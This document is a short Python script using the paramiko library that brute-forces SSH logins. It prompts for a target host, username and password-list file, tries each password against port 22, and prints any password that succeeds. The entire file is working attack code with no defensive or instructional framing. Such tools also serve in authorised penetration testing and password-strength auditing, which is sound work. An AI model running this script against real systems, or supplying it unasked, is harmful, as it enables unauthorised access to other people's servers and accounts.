import paramiko
import sys
import os
import socket

try:
    host = input("Enter target host address")
    username = input("Enter SSH username")
    input_file = input("Enter SSH password file")
    if os.path.exists(input_file) == False:
        print("File not exist")
except:
    print('Connection not possible')

def ssh_connect(password, code =0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error :
        code = 2
    ssh.close()
    return code

input_file =  open(input_file)
for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)
        if(response==0):
            print( "password found:" + password )
        elif(response ==1):
            print("Login Incorrect")
        elif(response ==2):
            print("Connection could not established")
            sys.exit(2)
    except:
        print("Error")
        pass
input_file.close()
